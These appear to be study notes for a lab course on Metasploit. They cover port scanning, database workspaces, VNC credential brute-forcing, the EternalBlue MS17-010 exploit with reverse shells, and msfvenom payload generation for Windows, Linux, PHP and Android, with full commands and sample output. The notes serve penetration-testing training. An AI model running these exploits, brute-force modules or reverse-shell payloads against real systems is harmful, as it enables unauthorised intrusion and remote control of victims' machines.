# 📝 Metasploit – Port Scanning & Service Discovery



## 🔑 What is Port Scanning?

Port scanning = process of checking which **ports are open** on a target machine.  
- Open ports = entry points for communication → may allow exploitation.  
- Metasploit provides **auxiliary scanner modules** to perform port scans.  



## ⚙️ Available Port Scan Modules

You can search portscan modules in Metasploit:
``` bash

msf6 > search portscan


| #  | Module Name                                | Description                  |
|----|---------------------------------------------|------------------------------|
| 1  | auxiliary/scanner/http/wordpress_pingback_access | WordPress pingback check     |
| 2  | auxiliary/scanner/natpmp/natpmp_portscan   | NAT-PMP external scan        |
| 3  | auxiliary/scanner/portscan/ack             | ACK firewall scan            |
| 4  | auxiliary/scanner/portscan/ftpbounce       | FTP bounce scan              |
| 5  | auxiliary/scanner/portscan/syn             | TCP SYN scan (fast, common)  |
| 6  | auxiliary/scanner/portscan/tcp             | TCP connect scan             |
| 7  | auxiliary/scanner/portscan/xmas            | Xmas scan (rare, stealthy)   |
| 8  | auxiliary/scanner/sap/sap_router_portscanner | SAP router scan             |
```
👉 To use any module:  
``` bash
use auxiliary/scanner/portscan/tcp
```


## ⚙️ Important Options in Port Scan

Show options:
``` bash
msf6 auxiliary(scanner/portscan/tcp) > show options

| Option       | Description |
|--------------|-------------|
| **CONCURRENCY** | Number of concurrent ports to check per host |
| **DELAY**       | Delay between connections (ms) |
| **JITTER**      | Random delay variation |
| **PORTS**       | Ports to scan (e.g., 22-25,80,110-900) |
| **RHOSTS**      | Target host or network |
| **THREADS**     | Number of threads (parallel scans) |
| **TIMEOUT**     | Socket connection timeout (ms) |

```

## 📊 Example – TCP Port Scan
``` bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.12.229
set PORTS 1-1000
set THREADS 20
run
```
👉 This will scan ports **1–1000** on target `10.10.12.229`.  



## 🚀 Using Nmap Inside Metasploit

You can directly run Nmap from Metasploit console:
``` bash
msf6 > nmap -sS 10.10.12.229
```
Sample Output:
``` bash
PORT STATE SERVICE
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
3389/tcp open ms-wbt-server
49152/tcp open unknown
```
👉 Note: Nmap is usually **faster & better** for port scanning than Metasploit.



## 📡 UDP Service Identification

UDP services don’t always respond → harder to detect.  
Metasploit module:  
``` bash
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS 10.10.12.229
run
```
Example Output:
``` bash
Discovered NetBIOS on 10.10.12.229:137
```
👉 This quickly finds common UDP services like DNS (53), NetBIOS (137).



## 🔎 SMB Scans (Example of Service Scanning)

SMB = file sharing protocol, common in corporate networks.  
Useful modules:  
- `auxiliary/scanner/smb/smb_enumshares` → List shares  
- `auxiliary/scanner/smb/smb_version` → Get SMB version  

Example:
``` bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.12.229
run
```
Output:
[+] 10.10.12.229:445 - SMB Version Detected



## 📋 Comparison – Nmap vs Metasploit Port Scanning

| Feature           | Nmap ✅ | Metasploit ✅ |
|-------------------|---------|---------------|
| Speed             | Faster  | Slower        |
| OS detection      | Yes     | No            |
| Service detection | Yes     | Limited       |
| Integration       | No      | Yes (direct exploitation after scan) |
| Best use          | General scanning | When you want to directly exploit after scan |



## 🧠 Key Points

- Use **Nmap** for fast scanning, service detection.  
- Use **Metasploit scanners** when you want results directly in Metasploit.  
- Don’t forget UDP services (DNS, NetBIOS).  
- Check for SMB, NetBIOS → can reveal hostnames, shares, weak passwords.  
- After scanning → try relevant **Metasploit exploits** on discovered services.  

---

# 📝 Metasploit Database & Workspaces

## 🔑 What is Metasploit Database?
Metasploit can connect with a **PostgreSQL database** to save scan results, hosts, services, and vulnerabilities.  
👉 Useful when working with multiple targets or big penetration testing projects.

### Benefits:
- Save scan results (Nmap, services, vulns)
- Manage multiple projects with **workspaces**
- Avoid repeating scans
- Easily reuse hosts/services in exploits

---

## ⚙️ Setting Up Database

Start PostgreSQL:
``` bash
systemctl start postgresql
```
Initialize Metasploit Database:
``` bash
msfdb init
```
Launch Metasploit and check status:
``` bash
msfconsole
db_status
```
👉 Output should be:
``` bash
[*] Connected to msf. Connection type: postgresql
```


## 🗂 Workspaces in Metasploit

List available workspaces:
``` bash
workspace
```
Add a new workspace:
``` bash
workspace -a tryhackme
```
Switch to a workspace:
``` bash
workspace tryhackme
```
Delete a workspace:
``` bash
workspace -d tryhackme
```
Help menu:
``` bash
workspace -h
```


## 🗄 Database Backend Commands

List all available commands:
``` bash
help
```
Important commands:
``` bash
analyze → Analyze database info about hosts
db_connect → Connect to existing database
db_disconnect → Disconnect from DB
db_export → Export database contents
db_import → Import scan results
db_nmap → Run Nmap and save results
hosts → List discovered hosts
services → List services of hosts
vulns → Show vulnerabilities
```


## 🔍 Example Workflow

1. Run Nmap scan and save to database:
``` bash
db_nmap -sV -p- 10.10.12.229
```
2. List hosts:
``` bash
hosts
```
3. List services:
``` bash
services
```
4. Use hosts as RHOSTS:
``` bash
hosts -R
```
5. Example: check for MS17-010 vulnerability:
``` bash
use auxiliary/scanner/smb/smb_ms17_010
hosts -R
show options
run
```


## 🧠 Key Points to Remember
- **db_nmap** → Save Nmap results directly into DB  
- **hosts / services** → Query discovered info  
- **workspace** → Manage multiple projects  
- **hosts -R** → Auto set RHOSTS from saved data  

👉 This makes pentesting **faster, organized, and scalable**.
---
# 📝 Metasploit – Finding Vulnerabilities (Low Hanging Fruit)

## 🔑 What are "Low Hanging Fruit"?
- "Low hanging fruit" = Easy-to-find, easy-to-exploit vulnerabilities.  
- These can give you a **foothold** on a system and sometimes **high privileges** (root/admin).  
- Example: Weak VNC, SMB, FTP credentials.

👉 Success depends on:
- Good **scanning** (port scans, service detection).  
- Proper **fingerprinting** (knowing exact service versions).  

---

## 🔍 Example: Identifying VNC Service
If scanning shows a **VNC service**, we can use Metasploit’s search:
``` bash
search vnc
```
Some available scanner modules:
``` bash
auxiliary/scanner/vnc/ard_root_pw
auxiliary/scanner/vnc/vnc_login
auxiliary/scanner/vnc/vnc_none_auth
```


## 📖 Getting Module Info
Always check what a module does:
``` bash
use auxiliary/scanner/vnc/vnc_login
info
```
Output (important parts):
- **Name**: VNC Authentication Scanner  
- **Rank**: Normal  
- **Purpose**: Tests VNC servers for login credentials  
- **Protocols Supported**: RFB 3.3, 3.7, 3.8, 4.001  
- **Reference**: CVE-1999-0506  

---

## ⚙️ Basic Options of `vnc_login`

| Option            | Default Value | Required | Description |
|-------------------|--------------|----------|-------------|
| BLANK_PASSWORDS   | false        | no       | Try blank passwords |
| BRUTEFORCE_SPEED  | 5            | yes      | Speed (0 = slow, 5 = fast) |
| PASS_FILE         | wordlist.txt | no       | Password list to try |
| USER_FILE         | none         | no       | Usernames list |
| RHOSTS            | (set target) | yes      | Target IP(s) |
| RPORT             | 5900         | yes      | VNC port |
| STOP_ON_SUCCESS   | false        | no       | Stop if valid creds found |
| THREADS           | 1            | yes      | Number of threads |

---

## ▶️ Example Usage

1. Select the module:
``` bash
use auxiliary/scanner/vnc/vnc_login
```
2. Set the target:
``` bash
set RHOSTS 10.10.12.229
```
3. Set wordlist:
``` bash
set PASS_FILE /usr/share/wordlists/vnc_passwords.txt
```
4. (Optional) Try blank passwords:
``` bash
set BLANK_PASSWORDS true
```
5. Run:
``` bash
run
```
👉 If successful, you’ll see:
[+] 10.10.12.229:5900 - Login Successful: user:password



## 🧠 Key Points to Remember
- Use `info` to understand module usage.  
- VNC often has **weak/no authentication**.  
- Module `vnc_login` checks login with usernames/passwords.  
- Found credentials can give **direct remote desktop access**.  
- These are classic **low hanging fruit** targets.

---
# 📝 Metasploit – Exploitation Framework (Exploits + Payloads + Sessions)

## 🔑 What is Metasploit Exploitation?
- Metasploit = **Exploitation Framework**.  
- Exploits are the **largest module category**.  
- Success = depends on good **service discovery & fingerprinting**.  

### 📊 Metasploit v5.0.101-dev
``` bash
=[ metasploit v5.0.101-dev]
-- --=[ 2048 exploits - 1105 auxiliary - 344 post]
----=| 562 payloads - 45 encoders - 10 nops]
-- --=[ 7 evasion]
```


## 🔍 Finding Exploits
1. **Search exploit**
``` bash
search ms17_010
```
2. **Select exploit**
``` bash
use exploit/windows/smb/ms17_010_eternalblue
```
3. **Info about exploit**
``` bash
info
```


## ⚡ Payloads in Metasploit
- Exploits have a **default payload**.  
- But you can list all compatible payloads:
``` bash
show payloads
```
### Example (MS17-010):
``` bash
0 generic/custom → Custom payload
1 generic/shell_bind_tcp → Bind TCP shell
2 generic/shell_reverse_tcp → Reverse TCP shell
3 windows/x64/exec → Execute command
```
👉 Choose payload:
``` bash
set payload generic/shell_reverse_tcp
```


## ⚙️ Exploit Options (MS17-010 Example)

### Module Options
| Option       | Required | Description |
|--------------|----------|-------------|
| RHOSTS       | yes      | Target host(s) |
| RPORT        | yes      | Target port (default: 445) |
| SMBDomain    | no       | Windows domain |
| SMBUser      | no       | Username |
| SMBPass      | no       | Password |
| VERIFY_ARCH  | yes      | Check target architecture |
| VERIFY_TARGET| yes      | Check OS matches exploit |

### Payload Options (Reverse TCP)
| Option | Required | Description |
|--------|----------|-------------|
| LHOST  | yes      | Attacker IP (listener) |
| LPORT  | yes      | Listening port (default: 4444) |



## ▶️ Example Exploit Run
``` bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.12.229
set payload generic/shell_reverse_tcp
set LHOST 10.10.186.44
set LPORT 4444
exploit
```
### Sample Output
``` bash
[*] Started reverse TCP handler on 10.10.186.44:4444
[+] 10.10.12.229:445 - Host is VULNERABLE to MS17-010
[+] Exploit packet sent successfully
[+] Session opened: 10.10.12.229:49366 -> 10.10.186.44:4444

```

## 🖥️ Working with Sessions

### 1. List Active Sessions
``` bash
sessions
```
Output:
Id Name Type Information
1 - shell x64/win 10.10.12.229:49366 (Windows 7 SP1)

### 2. Interact with Session
``` bash
sessions -i 1
```
Now you have shell:
``` bash
C:\Windows\system32>
```
### 3. Background a Session
``` bash
CTRL+Z
y
```
### 4. Session Management (Options)
``` bash
sessions -h
```
Useful flags:
- `-i [ID]` → Interact with session  
- `-k [ID]` → Kill session  
- `-n`      → Rename session  
- `-u [ID]` → Upgrade shell → meterpreter  
- `-v`      → Verbose info  
- `-q`      → Quiet mode  



## 🧠 Key Points
- Use **`search` → `use` → `info` → `set` → `exploit`** workflow.  
- Payloads may require extra options (LHOST, LPORT).  
- Always verify target architecture & OS.  
- **Sessions** allow multiple shells → background, rename, upgrade.  
- EternalBlue (`MS17-010`) = famous Windows SMB exploit.  

---
# 📝 MSFvenom – Payload Generation Tool

## 🔑 What is MSFvenom?
- **MSFvenom** = Replacement of `msfpayload` + `msfencode`.
- Used to **generate payloads** in different formats (exe, elf, php, asp, etc.).
- Supports **all target systems**: Windows, Linux, Android, iOS, Apple, PHP, Python, etc.
- Can also **encode** payloads (basic obfuscation).

---

## 📌 Listing Payloads
``` bash
msfvenom -l payloads
``` 
Sample Output:
``` bash
aix/ppc/shell_bind_tcp → Spawn bind shell
aix/ppc/shell_reverse_tcp → Reverse TCP shell
android/meterpreter/reverse_tcp → Android Meterpreter shell
apple_ios/aarch64/shell_reverse_tcp → iOS reverse TCP shell
...
```

👉 Total Payloads (example):
``` bash
Framework Payloads: 562
```


## 📌 Listing Output Formats
``` bash
msfvenom --list formats
```
Examples:
- `exe` → Windows executable
- `elf` → Linux binary
- `raw` → Raw payload
- `asp` → ASP script
- `php` → PHP script
- `py`  → Python script



## 📌 Encoders
- Encoders **encode shellcode** (not guaranteed to bypass AV).  
- Example encoders: `x86/shikata_ga_nai`, `php/base64`  

Usage:
``` bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```
Output:
``` bash
Payload size: 1507 bytes
Encoded with php/base64
```


## 📌 Generating Payloads

### 1. PHP Reverse Shell
``` bash
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
```
⚠️ Edit file to add:
```php
<?php
...payload code...
?>
```
### 2. Linux ELF Payload
``` bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f elf > shell.elf
chmod +x shell.elf
```
### 3. Windows Executable Payload
``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f exe > shell.exe
```
### 4. ASP Payload (Windows IIS Servers)
``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f asp > shell.asp
```
### 5. Python Payload
``` bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=4444 -f raw > shell.py
```
### 6. Android APK Payload
``` bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 R > shell.apk
```
## 📌 Handlers (Catching the Shell)
When you generate a payload with msfvenom, you need a listener (handler).
**Start Handler**
``` bash
msfconsole
use exploit/multi/handler
set payload php/reverse_php
set LHOST 10.0.2.19
set LPORT 7777
run
```
Output:
``` bash
[*] Started reverse TCP handler on 10.0.2.19:7777
[*] Meterpreter session opened
```
## 📌 Quick Examples
- Windows exe Meterpreter
``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=5555 -f exe > win_shell.exe
```
- Linux ELF shell
``` bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.0.1 LPORT=5555 -f elf > linux_shell.elf
```
- PHP shell
``` bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=5555 -f raw > shell.php
```
- Android APK
``` bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=5555 R > backdoor.apk
```
## 🧠 Key Points
- Always set LHOST = Attacker IP, LPORT = Listening Port.
- Choose correct format for target OS (exe = Windows, elf = Linux, apk = Android, php = webservers).
- Use multi/handler in Metasploit to catch the shell.
- Encoders only obfuscate payloads, not guaranteed AV bypass.
